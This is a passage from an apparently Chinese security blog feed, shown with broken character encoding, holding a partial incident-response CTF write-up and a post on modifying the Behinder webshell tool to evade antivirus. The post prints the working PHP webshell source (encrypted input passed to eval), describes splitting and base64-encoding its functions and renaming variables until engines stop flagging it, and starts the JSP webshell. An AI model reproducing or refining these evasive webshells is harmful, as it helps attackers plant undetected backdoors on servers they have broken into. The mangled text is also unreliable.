href="mailto:&#108;&#x69;&#101;&#98;&#x65;&#x72;&#116;&#50;&#x39;&#48;&#x39;&#54;&#54;&#x31;&#x33;&#55;&#x37;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;&#x43;&#108;&#x6f;&#x6e;&#101;&#x57;&#105;&#x74;&#x68;">&#108;&#x69;&#101;&#98;&#x65;&#x72;&#116;&#50;&#x39;&#48;&#x39;&#54;&#54;&#x31;&#x33;&#55;&#x37;&#64;&#x71;&#x71;&#x2e;&#99;&#x6f;&#109;&#x43;&#108;&#x6f;&#x6e;&#101;&#x57;&#105;&#x74;&#x68;</a></p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢è·å–åˆ°çš„FLAGæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åˆ†æ•°</p><p>107.38 åˆ†</p><p><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726181641642.png" alt="image-20250726181641642"></p><p>ç›´æ¥æœå³å¯ã€ä»»åŠ¡5ã€‘VOL_EASY</p><p>69äººå·²è§£ç­”</p><p><a href="mailto:&#50;&#x39;&#48;&#x39;&#54;&#x36;&#x31;&#x33;&#x37;&#x37;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#109;&#x64;&#97;&#121;&#x65;&#56;&#107;&#117;&#x61;&#114;&#105;&#97;">&#50;&#x39;&#48;&#x39;&#54;&#x36;&#x31;&#x33;&#x37;&#x37;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#109;&#x64;&#97;&#121;&#x65;&#56;&#107;&#117;&#x61;&#114;&#105;&#97;</a></p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢å…¥ä¾µçš„ç½‘ç«™åœ°å€æ˜¯å¤šå°‘ï¼ˆåªéœ€è¦<a href="http://xxxxx/%EF%BC%89%EF%BC%9F">http://xxxxx/ï¼‰ï¼Ÿ</a></p><p>åˆ†æ•°</p><p>150.16 åˆ†<br><img src="D:\myBlog\images\2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-7æœˆ-éƒ¨åˆ†wp\image-20250726181938884-17535251791084.png" alt="image-20250726181938884"></p><p>iehistoryã€ä»»åŠ¡6ã€‘VOL_EASY</p><p>80äººå·²è§£ç­”</p><p><a href="mailto:&#x32;&#57;&#x30;&#57;&#x36;&#x36;&#x31;&#51;&#x37;&#x37;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;&#x78;&#x33;&#x78;&#100;&#97;&#x79;&#x65;&#x38;&#x6b;&#117;">&#x32;&#57;&#x30;&#57;&#x36;&#x36;&#x31;&#51;&#x37;&#x37;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;&#x78;&#x33;&#x78;&#100;&#97;&#x79;&#x65;&#x38;&#x6b;&#117;</a></p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢å…¥ä¾µæ—¶ï¼Œä½¿ç”¨çš„ç³»ç»Ÿç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åˆ†æ•°</p><p>72.47 åˆ†</p><p>ä¸Šé¢å¯ä»¥çœ‹å‡º administrator</p><p>ã€ä»»åŠ¡7ã€‘VOL_EASY</p><p>41äººå·²è§£ç­”</p><p>daye8kuCloneWithzzpu213</p><p>é¢˜ç›®æè¿°</p><p>é»‘å®¢åˆ›å»ºéšè—è´¦æˆ·çš„å¯†ç æ˜¯å¤šå°‘ï¼Ÿ</p><p>åˆ†æ•°</p><p>232.73 åˆ†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å†°èäºŒå¼€ä»0åˆ°1-2(å…æ€)</title>
      <link href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/"/>
      <url>/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>æœ‰å°ä¼™ä¼´æè®®è¯´ï¼Œæˆ‘ä»¬ä¸Šä¸ªæ–‡ç« æ”¹äº†ä¸€ä¸‹å†°èçš„æµé‡ï¼Œä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬æ‰“æˆ˜è‚¯å®šè¦å…ˆä¼ æœ¨é©¬è½åœ°ï¼Œå¦‚æœä¸èƒ½è½åœ°ï¼Œé‚£ä¹ˆä½ æµé‡æ”¹çš„å†å¥½ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰æ„ä¹‰ï¼Œæƒ³æƒ³ï¼Œç¡®å®ä¹Ÿæ˜¯ã€‚æ²¡æœ‰ç¬¬ä¸€æ­¥ä¸Šä¼ æ–‡ä»¶ï¼Œå“ªé‡Œå­˜åœ¨æµé‡å‘¢ã€‚</p><p>é‚£ä¹ˆè¿™æ¬¡å’±ä»¬æ¥åšä¸€ä¸‹å…æ€ã€‚åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œä¼¼ä¹æˆ‘ä»¬ç»å¸¸ç¢°åˆ°å®‰å…¨è®¾å¤‡ï¼Œå¥ˆä½•å’±è¿™ä¹Ÿæ²¡æœ‰å•¥å®‰å…¨è®¾å¤‡ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨å¸¸è§çš„å‚å•†çš„åœ¨çº¿æ€è½¯å§ã€‚å¦‚æœæœ‰å°ä¼™ä¼´æœ‰çš„è¯ï¼Œå¯ä»¥å¸®æˆ‘æµ‹æµ‹ï¼ŒæŠŠç»“æœå‘Šè¯‰æˆ‘ï¼Œç¬”è€…å†è¿›è¡Œä¼˜åŒ–ã€‚</p><h5 id="uiç¼–å†™"><a href="#uiç¼–å†™" class="headerlink" title="uiç¼–å†™"></a>uiç¼–å†™</h5><p>åœ¨godzillaä¸­ï¼Œä½œè€…å·²ç»ç»™æˆ‘ä»¬å†™å¥½äº†ç”Ÿæˆè„šæœ¬çš„æŒ‰é’®ï¼Œåªéœ€è¦è‡ªå·±å»ç”Ÿæˆå°±å¥½äº†ï¼Œä½†æ˜¯å†°èæ˜¯ä¸è‡ªå¸¦çš„ï¼Œå†°èçš„æœ¨é©¬æ˜¯åœ¨æˆ‘ä»¬ä¸‹è½½çš„æ—¶å€™ï¼Œæ”¾åœ¨åŒç›®å½•é‡Œé¢çš„ï¼Œç›´æ¥æ‹¿å»ç”¨å°±å¥½äº†ã€‚ä½†ä¼¼ä¹ä¸å¤ªé€‚åˆæˆ‘ä»¬ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºå°±ç®—æˆ‘ä»¬å°†å…æ€åçš„æœ¨é©¬æ”¾åˆ°ç›®å½•ä¸‹ï¼Œä»–åªèƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå°±æ˜¯ä¸èƒ½åŠ¨æ€çš„ç”Ÿæˆäº†ï¼Œä¸€ä¸ªå…æ€æ–‡ä»¶å¾ˆå®¹æ˜“è¢«å‚å•†æ ‡è®°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯æƒ³åŠæ³•å»æ¯æ¬¡ç”Ÿæˆçš„éƒ½ä¸å¤ªä¸€æ ·ã€‚</p><p>net/rebeyond/behinder/ui/controlleræ˜¯å†°èç•Œé¢çš„ç›®å½•ï¼Œé‡Œé¢æœ‰å¾ˆå¤šæ–‡ä»¶ï¼ŒåŒ…å«å„ç§controller<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706025725077-17517418458692.png" alt="image-20250706025725077"></p><p>å…¶ä¸­javaçš„è‚¯å®šéƒ½æ˜¯å„ç§åŠŸèƒ½æ–‡ä»¶äº†ï¼Œfxmlæ˜¯uiç•Œé¢äº†ï¼Œå†°èçš„uiç•Œé¢ä½¿ç”¨çš„æ˜¯JavaFXã€‚</p><p><strong>JavaFX</strong> æ˜¯ Java å¹³å°çš„ä¸€ä¸ªå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰å·¥å…·åŒ…ï¼Œç”¨äºåˆ›å»º<strong>å¯Œå®¢æˆ·ç«¯åº”ç”¨ï¼ˆRich Client Applicationï¼‰</strong>ã€‚å®ƒæ˜¯ Java çš„å®˜æ–¹ GUI åº“ä¹‹ä¸€ï¼Œæ˜¯ Swing çš„ç°ä»£æ›¿ä»£æ–¹æ¡ˆï¼Œæ”¯æŒç¡¬ä»¶åŠ é€Ÿã€æ ·å¼åŒ–ï¼ˆCSSï¼‰ã€åŠ¨ç”»ã€å¤šåª’ä½“ç­‰åŠŸèƒ½ã€‚</p><p>ç®€å•çœ‹ä¸€ä¸ªmain.fxml</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030023010.png" alt="image-20250706030023010"></p><p>å¯ä»¥çœ‹åˆ°ä¸€äº›TableColumnï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030109566-17517420700973.png" alt="image-20250706030109566"></p><p>éœ€è¦æ”¹ä»€ä¹ˆçš„è¯ï¼Œæ”¹è¿™é‡Œå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œä¸åœ¨è®²è§£javafxçš„è¯­æ³•äº†ï¼Œä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œæ˜¯åœ¨ä¸ä¼šå†™ï¼Œå¯ä»¥ç”¨scene builderå»ç•Œé¢è¯ç¼–ç¨‹ï¼Œå®‰è£…å<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030455421.png" alt="image-20250706030455421"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030515440.png" alt="image-20250706030515440"></p><p>å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œç›´æ¥æ‹–åŠ¨å³å¯ã€‚</p><p>æ¥ä¸‹æ¥å¼€å§‹å†™ï¼Œåœ¨net/rebeyond/behinder/ui/Main.fxmlï¼Œå…ˆåŠ ä¸ªæŒ‰é’®ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030708263.png" alt="image-20250706030708263"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706030716807.png" alt="image-20250706030716807"></p><p>ç„¶åç»™åˆ°åŠŸèƒ½ç‚¹ï¼Œæœ¬æ¥ç¬”è€…æƒ³ç€ç›´æ¥åœ¨main.fxmlé‡Œé¢ç›´æ¥å†™ï¼Œä½†æ˜¯æŠŠä»–çš„åŠŸèƒ½ç‚¹net.rebeyond.behinder.ui.controller.MainControllerï¼Œcopyä¸€ä»½åï¼Œæ€»å®æŠ¥é”™ï¼Œåé¢ä¹Ÿæ²¡è§£å†³æ‰ï¼Œç´¢æ€§ç›´æ¥ä»æ–°å®šä¹‰ä¸€ä¸ªControllerï¼Œå†™è‡ªå·±çš„åŠŸèƒ½ã€‚æˆ‘ä»¬ä¹Ÿä»æ–°å®šä¹‰ä¸€ä¸ªå…æ€ç”Ÿæˆçš„ç•Œé¢ï¼Œå°±æ˜¯ç‚¹å‡»æŒ‰é’®åçš„ç•Œé¢ï¼Œmiansha.fxml</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706080335741.png" alt="image-20250706080335741"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706080719677.png" alt="image-20250706080719677"></p><p>å®ƒçš„Controllerï¼Œä¹Ÿæ˜¯è‡ªå·±å®šä¹‰çš„ï¼Œä¸€ä¼šåœ¨é‡Œé¢å†™åŠŸèƒ½ç‚¹ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706080437654.png" alt="image-20250706080437654"></p><p>å› ä¸ºåˆšåˆšæˆ‘ä»¬æåˆ°MainControllerä¸èƒ½é‡æ–°å†™ï¼Œè€æ˜¯æŠ¥é”™ï¼Œæˆ‘ä»¬å°±å°†å…æ€çš„æŒ‰é’®ç»‘å®šåˆ°main.javaï¼Œç„¶åè¯»å–miansha.fxmlï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250706080647669.png" alt="image-20250706080647669"></p><p>è¿™æ ·ï¼Œæ•´ä¸ªæ¡†æ¶å°±å®Œæˆäº†ï¼Œåé¢å°±æ˜¯è¡¥ä¸€ä¸‹æ¯ä¸ªç”Ÿæˆå…æ€çš„åŠŸèƒ½ç‚¹äº†ã€‚</p><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>ï¼Œ <span class="string">&quot;AES128&quot;</span>ï¼Œ <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>ï¼Œ<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C()ï¼Œ<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆçœ‹åŸç‰ˆçš„serverç«¯æœ¨é©¬ï¼Œå®šä¹‰äº†keyï¼Œ<code>$post=file_get_contents(&quot;php://input&quot;);</code>è·å–æ‰€æœ‰è¾“å…¥å†…å®¹ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šç¯‡æ–‡ç« çœ‹åˆ°çš„å†°èçš„æµé‡æ˜¯ä¸éœ€è¦ä¼ å‚çš„ï¼Œæ‹¿åˆ°postçš„æ•°æ®åï¼Œä¸¤ç§æ–¹å¼ï¼Œå¦‚æœæ²¡æœ‰opensslï¼Œå°±ç”¨postå¼‚æˆ–keyï¼Œå¦‚æœæœ‰opensslï¼Œé‚£ä¹ˆå°±aesè§£å‘æ¥çš„æ•°æ®ï¼Œç„¶åç”¨<code>|</code>åŒºåˆ†evalå’Œassertä¹Ÿå°±æ˜¯åŒºåˆ†php5å’Œphp7å»æ‰§è¡Œå‘½ä»¤</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250708142341950.png" alt="image-20250708142341950"></p><p>åé¢å°±å¥½ç†è§£äº†ï¼Œç”¨__invoke()æ–¹æ³•ï¼Œå½“ä½ åƒè°ƒç”¨å‡½æ•°ä¸€æ ·â€œè°ƒç”¨ä¸€ä¸ªå¯¹è±¡â€æ—¶ï¼ŒPHP ä¼šè‡ªåŠ¨æ‰§è¡Œè¿™ä¸ªå¯¹è±¡çš„ <code>__invoke()</code> æ–¹æ³•ï¼›</p><p><code>class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</code>å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œ<code>@call_user_func(new C()ï¼Œ$params);</code>è°ƒç”¨è¿™ä¸ªç±»ï¼Œæ­¤æ—¶$params=$pï¼Œç„¶åæ‰§è¡Œä¸Šé¢å›¾ç‰‡ä¸­çœ‹åˆ°çš„evalã€‚</p><p>å¥½ï¼Œäº†è§£å®Œæœ¨é©¬ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å…æ€äº†ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709231438699.png" alt="image-20250709231438699"></p><p>æºç è‚¯å®šæŠ¥æ¯’ï¼Œæˆ‘ä»¬å…ˆæ¥fuzzä¸€ä¸‹ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709231528436.png" alt="image-20250709231528436"></p><p>å»æ‰ä¸€åŠï¼ŒæŠ¥</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709231610013.png" alt="image-20250709231610013"></p><p>è¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å¯ä»¥å…ˆbase64 åœ¨è§£å›æ¥ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709232118501.png" alt="image-20250709232118501"></p><p>è¿™é‡Œå†æŠŠfile_get_contentsç»™æ‹†é™¤å»ï¼Œæ—¢å¯ä»¥äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥base64ä¸€ä¸‹</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709232220803.png" alt="image-20250709232220803"></p><p>æ­¤æ—¶å°±æŠ¥evaläº†ï¼Œæˆ‘ä»¬å†å»è§£å†³evalçš„é—®é¢˜ã€‚<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨godzillaé‚£ç§å†™æ³•ï¼Œå°±å¯ä»¥äº†</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709235845934.png" alt="image-20250709235845934"></p><p>å¤§å®¶ä¼šçœ‹åˆ°ï¼Œä¸‹é¢çš„é­”æœ¯å‡½æ•°æ²¡äº†ï¼Œå…¶å®ä¸ç”¨ï¼Œåæ­£éƒ½æ˜¯åŠ è½½evalï¼Œæœ‰ä¸€ä¸ªå°±å¯ä»¥äº†ï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709232552802.png" alt="image-20250709232552802"></p><p>æŠ¥å¯ç–‘æ–‡ä»¶ï¼Œè¿™é‡Œä¸çŸ¥é“å“ªé‡ŒæŠ¥äº†ï¼Œæˆ‘ä»¬æ¥ç€fuzz<br>ç»è¿‡guzzå‘ç°æ˜¯åœ¨xoré‚£é‡Œï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709232744325-17520748650231.png" alt="image-20250709232744325"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$post</span>=<span class="variable">$sddd</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™å¥½åŠï¼Œæˆ‘ä»¬æ”¹æ”¹å˜é‡ï¼Œæ”¹æ”¹æ•°å­—å³å¯ï¼Œå†™åˆ°å‡½æ•°é‡Œå°±å¯ä»¥äº†ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709234009451.png" alt="image-20250709234009451"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709234028560.png" alt="image-20250709234028560"></p><p>æ²³é©¬æœ¬åœ°ç‰ˆï¼Œ<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709235052885.png" alt="image-20250709235052885"></p><p>ç½‘é¡µç‰ˆæœ‰é—®é¢˜ï¼Œæˆ‘ä»¬ä¹Ÿfuzzä¸€ä¸‹ï¼Œ</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709235150875.png" alt="image-20250709235150875"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709235833348.png" alt="image-20250709235833348">æˆ‘ä»¬è¿™é‡Œç›´æ¥æŠŠevalæ‹¿æ‰ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250709235652766.png" alt="image-20250709235652766"></p><p>å°±å¯ä»¥äº†ï¼Œå•Šè¿™ï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710000036036.png" alt="image-20250710000036036"></p><p>è¿™é‡Œç›´æ¥æŠŠæ‰€æœ‰çš„éƒ½åˆ æ‰ï¼Œå°±å‰©evalï¼Œ<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710000109872.png" alt="image-20250710000109872"></p><p>ä¹Ÿè¿˜æ˜¯ä¸è¡Œï¼Œé‚£è¿™æ ·çš„è¯ï¼Œæš‚æ—¶å°±è§£å†³ä¸æ‰äº†ã€‚<br>å¾®æ­¥<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710005546630.png" alt="image-20250710005546630"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710005557304.png" alt="image-20250710005557304"></p><p>ç«ç»’ï¼Œ360</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710010235877.png" alt="image-20250710010235877"></p><p>å…¶ä»–å°±ä¸åœ¨æµ‹è¯•äº†ï¼Œå¤§å®¶è¦æ˜¯æœ‰å•¥å•†ä¸šçš„å¯ç–‘å¸®æˆ‘æµ‹æµ‹ï¼Œæissueã€‚å¥½å¼€å§‹å°è£…åˆ°é‡Œé¢ï¼Œè¿™æ¬¡æˆ‘ä»¬ä¾ç„¶ç”¨åŠ¨æ€çš„ï¼Œä¿è¯æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬hashéƒ½ä¸ä¸€æ ·ã€‚<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710010649587.png" alt="image-20250710010649587"></p><p>å…ˆç»™å®šä¸€ä¸ªæ¨¡æ¿ï¼Œç„¶åå°†å˜é‡æ›¿æ¢æ‰ï¼ŒèŠ±ä¸€ç‚¹æ—¶é—´ï¼Œå†™ä¸€ä¸‹<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710012845890.png" alt="image-20250710012845890"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710022245696.png" alt="image-20250710022245696"></p><p>okï¼Œæ‰“åŒ…ï¼Œç¼–è¯‘<br><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710022415478.png" alt="image-20250710022415478"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710022447466.png" alt="image-20250710022447466"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710022434216.png" alt="image-20250710022434216"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710024629907.png" alt="image-20250710024629907"></p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710022526908.png" alt="image-20250710022526908"></p><p>æ²¡æœ‰é—®é¢˜ï¼Œæ­£å¸¸ä½¿ç”¨ã€‚</p><p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20250710024401997.png" alt="image-20250710024401997"></p><p>å¥½çš„ï¼Œphpæˆ‘ä»¬å°±å…ˆåˆ°è¿™é‡Œï¼Œæ¥ä¸‹æ¥jspã€‚</p><h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>è€æ ·å­ï¼Œå…ˆæ¥å­¦ä¹ ä¸€ä¸‹jspçš„æœ¨é©¬</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*ï¼Œjavax.crypto.*ï¼Œjavax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(bï¼Œ<span class="number">0</span>ï¼Œb.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 